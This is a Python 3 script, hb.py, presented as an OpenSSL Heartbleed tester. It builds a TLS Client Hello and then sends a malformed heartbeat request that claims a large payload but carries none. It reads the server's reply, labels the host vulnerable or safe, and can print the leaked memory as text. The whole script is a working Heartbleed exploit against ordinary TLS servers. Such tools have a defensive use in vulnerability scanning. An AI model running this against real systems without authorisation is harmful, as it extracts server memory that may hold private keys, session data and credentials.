#!/usr/bin/env python

#   File:      hb.py
#   Author:    Paul Greenberg (http://www.greenberg.pro)
#   Created:   04/10/2014
#   Purpose:   OpenSSL Heartbleed bug tester
#   Version:   1.0
#   Copyright: (c) 2014 Paul Greenberg <paul@greenberg.pro>
#
#   This program is free software: you can redistribute it and/or modify
#   it under the terms of the GNU General Public License as published by
#   the Free Software Foundation, either version 3 of the License, or
#   (at your option) any later version.
#
#   This program is distributed in the hope that it will be useful,
#   but WITHOUT ANY WARRANTY; without even the implied warranty of
#   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#   GNU General Public License for more details.
#
#   You should have received a copy of the GNU General Public License
#   along with this program.  If not, see <http://www.gnu.org/licenses/>.


import os;
import sys;
if sys.version_info[0] < 3:
    sys.stderr.write(os.path.basename(__file__) + ' requires Python 3 or higher.\n');
    sys.stderr.write('python3 ' + os.path.basename(__file__) + '\n');
    exit(1);
import argparse;
import pprint;
import string;
import time;
import uuid;
import tempfile;

import socket;
import traceback;
import re;
import random;

log_lvl=0;
port=443;
target=None;
tlsv=None;

def check_tls_ver(v):
    if v == '1.0':
        TLS_VER = b'\x03\x01';
    elif v == '1.1':
        TLS_VER = b'\x03\x02';
    elif v == '1.2':
        TLS_VER = b'\x03\x03';
    else:
        TLS_VER = b'\x03\x01';
    return TLS_VER;


def ssl_hb_maker(v):

    TLS_VER = check_tls_ver(v);

    ssl_hb  = b'\x18';                                          # TLS Content Type [Keepalive (18)] [1 byte];
    ssl_hb += TLS_VER;                                          # TLS Version [2 bytes];
    ssl_hb += b'\x00\x03';                                      # TLS Layer Length  [2 bytes]
    ssl_hb += b'\x01'                                           # Hearbeat Protocol Type [1 byte]
                                                                #    (1) is request
                                                                #    (2) is response
#    ssl_hb += b'\x40\x00';                                     # Hearbeat Protocol Length [2 bytes]
#    ssl_hb += b'\x4C\x00';                                     # Hearbeat Protocol Length [2 bytes]    # detectable
    ssl_hb += b'\x50\x00';                                      # Hearbeat Protocol Length [2 bytes]
#    ssl_hb += b'\xff\xfe';                                     # Hearbeat Protocol Length [2 bytes]
                                                                #
                                                                # intentionally omit payload and padding
    return ssl_hb;

def ssl_ch_maker(v):

    TLS_VER = check_tls_ver(v);

    ssl_ch = b'';

    ssl_ch_type = b'\x16';                                      # TLS Content Type [Handshake (22)] [1 byte]
    ssl_ch_version = TLS_VER;                                   # TLS Version [2 bytes]
    ssl_ch_len = b'\x00\x00';                                   # TLS Layer Length  [2 bytes]

    ssl_ch_hsh_type = b'\x01';                                  # Handshake Protocol Type [1 byte]
    ssl_ch_hsh_len = b'\x00\x00\x00';                           # Handshake Protocol Length [3 bytes]
    ssl_ch_hsh_version = TLS_VER;                               # Handshake Protocol Version (TLS 1.0) [2 bytes]

    ssl_ch_random_time = b'\xf9\xdd\x30\x5d';                   # Random GMT Unix Time [4 bytes]

                                                                # Random Bytes Sequence [28 bytes]

    ssl_ch_random_bytes = b'';
    for i in range(28):
        ssl_ch_random_bytes += int2bytes(random.randrange(255), 1);

    ssl_ch_session_id = b'\x00';                                # Session ID Length [1 byte]

                                                                # Cipher Suites: 45 suites [90 bytes]


    ssl_ch_cipher  = b'\xc0\x14\xc0\x0a\x00\x39\x00\x38\x00\x88\x00\x87\xc0\x0f\xc0\x05';
    ssl_ch_cipher += b'\x00\x35\x00\x84\xc0\x12\xc0\x08\x00\x16\x00\x13\xc0\x0d\xc0\x03';
    ssl_ch_cipher += b'\x00\x0a\xc0\x13\xc0\x09\x00\x33\x00\x32\x00\x9a\x00\x99\x00\x45';
    ssl_ch_cipher += b'\x00\x44\xc0\x0e\xc0\x04\x00\x2f\x00\x96\x00\x41\x00\x07\xc0\x11';
    ssl_ch_cipher += b'\xc0\x07\xc0\x0c\xc0\x02\x00\x05\x00\x04\x00\x15\x00\x12\x00\x09';
    ssl_ch_cipher += b'\x00\x14\x00\x11\x00\x08\x00\x06\x00\x03';

    ssl_ch_cipher_len  =  int2bytes(len(ssl_ch_cipher), 2);     # Cipher Suites Length [ 2bytes]

    ssl_ch_compress = b'\x00';                                  # Compression: 1 method (null) [1 byte]
    ssl_ch_compress_len =  int2bytes(len(ssl_ch_compress), 1);  # Compression Methods Length   [1 byte]

    ssl_ch_extension  = b'\x00\x0f';                            # Extension: heartbeat   [Type]    [2 bytes]
    ssl_ch_extension += b'\x00\x01';                            # Extension: heartbeat   [Length]  [2 bytes]
    ssl_ch_extension += b'\x02';                                # Extension: heartbeat   [Payload] [n bytes]

    ssl_ch_extension_len = int2bytes(len(ssl_ch_extension), 2); # Length of all extensions [2 bytes]

    ssl_ch += ssl_ch_hsh_version + ssl_ch_random_time + ssl_ch_random_bytes + ssl_ch_session_id;
    ssl_ch += ssl_ch_cipher_len + ssl_ch_cipher + ssl_ch_compress_len;
    ssl_ch += ssl_ch_compress + ssl_ch_extension_len + ssl_ch_extension;

    ssl_ch_hsh_len =  int2bytes(len(ssl_ch), 3);

    ssl_ch = ssl_ch_hsh_type + ssl_ch_hsh_len + ssl_ch;

    ssl_ch_len =  int2bytes(len(ssl_ch), 2);

    ssl_ch = ssl_ch_type + ssl_ch_version + ssl_ch_len + ssl_ch;

    return ssl_ch;


def int2bytes(sz = None, btsz = 1):
    ''' sz = integer, btsz = desired size of byte array '''

    bt = b'';
    if sz > 255:
        pass;
    else:
        for i in range(btsz - 1):
            bt += b'\x00';
    bt += bytes([sz]);

    return bt;


def display_hex(bt, mode='slash'):
    btbuf = [];
    for b in bt:
        if re.search('slash', mode):
            btbuf.append(re.sub(r'^0x', r'\x', format(b, '#04x')));
        elif re.search('zero', mode):
            btbuf.append(format(b, '#04x'));
        elif re.search('ascii', mode):
            if (b > 31 and b < 127 ):
                btbuf.append(str(chr(b)));
            else:
                btbuf.append('.');
        else:
            btbuf.append(format(b, '#04x'));

    if re.search('ascii', mode) and re.search('nice', mode):
        t = ''.join(btbuf);
        print(re.sub("(.{80})", "\\1\n", t, 0, re.DOTALL));
    elif re.search('nice', mode):
        print(''.join(btbuf));
    else:
        print(''.join(btbuf));

    return;


def main():
    global log_lvl, target, tlsv, port;
    func = 'main()';
    parser = argparse.ArgumentParser(description='OpenSSL Heartbleed bug tester.');
    parser.add_argument('-ho', '--host', dest='ihost', metavar='HOST', help='target host', required=True);
    parser.add_argument('-t',  '--tls',  dest='iver', metavar='TLSV', help='TLS versions (default: 1.0, 1.1, 1.2), e.g. -t 1.1');
    parser.add_argument('-p',  '--port',  dest='iport', metavar='PORT', help='TCP port (default: 443)', type=int);
    parser.add_argument('--log',         dest='ilog',  metavar='LOGLEVEL', type=int, help='log level (default: 0)');
    args = parser.parse_args();

    if args.ilog:
        log_lvl = args.ilog;
    else:
        log_lvl = 0;

    if args.ihost:
        target = str(args.ihost);

    if args.iport:
        port = args.iport;
    else:
        port = 443;

    if args.iver:
        tlsv = str(args.iver);
        if tlsv not in ['1.0', '1.1', '1.2']:
            tlsv = '1.0';
    else:
        tlsv = '1.0';

    if log_lvl > 10:
        print('Using TLS ' + tlsv + ' ...');
        print('Started testing "' + target + '" ...');

    ssl_sh = b'';
    ssl_ch = ssl_ch_maker(tlsv);
    if log_lvl > 10:
        display_hex(ssl_ch);

    ssl_hbr = b'';
    ssl_hb = ssl_hb_maker(tlsv);

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM);
    s.settimeout(2);

    try:
        s.connect((target, port));

        if log_lvl > 10:
            print('Connected to ' + target + '" ...');
            print('Sending Client Hello ...');

        s.sendall(ssl_ch);

        if log_lvl > 10:
            display_hex(ssl_ch);
            print('Receiving Server Hello ...');

        while True:
            try:
                data = s.recv(1);
                if data == b'':
                    if log_lvl > 10:
                        print('Connnection was closed due to empty byte.');
                    break;
                ssl_sh += data;
            except:
                if log_lvl > 10:
                    print('Connnection was close due to unexpected error.');
                break;

        if log_lvl > 10:
            display_hex(ssl_sh);
            print('Sending heartbeat request');
            display_hex(ssl_hb);

        s.sendall(ssl_hb);

        if log_lvl > 10:
            print('Receiving heartbeat response');

        while True:
            try:
                data = s.recv(1);
                if data == b'':
                    if log_lvl > 10:
                        print('Connnection was closed due to empty byte.');
                    break;
                ssl_hbr += data;
            except:
                if log_lvl > 10:
                    print('Connnection was close due to unexpected error.');
                break;

        if log_lvl > 10:
            display_hex(ssl_hbr);
            print('Heartbeat Reponse Length: ' + str(len(ssl_hbr)) + ' bytes ...');

        if len(ssl_hbr) > 100:
            print('status|' + target + '|' + tlsv + '|vulnerable');
        elif len(ssl_hbr) == 0:
            print('status|' + target + '|' + tlsv + '|safe');
        else:
            print('status|' + target + '|' + tlsv + '|indeterminate');

    except Exception as err:
        print('status|' + target + '|' + tlsv + '|failed');
        print(str(err));
        print(str(traceback.format_exc()));
        return;

    s.close();

    if log_lvl > 10:
        print('Closed connection to ' + target + ' ...');
        print('Ended testing "' + target + '" ...');

    if log_lvl > 0 and len(ssl_hbr) > 0:
        print('Heartbeat Response:');
        display_hex(ssl_hbr, 'ascii-nice');

if __name__ == '__main__':
    main();
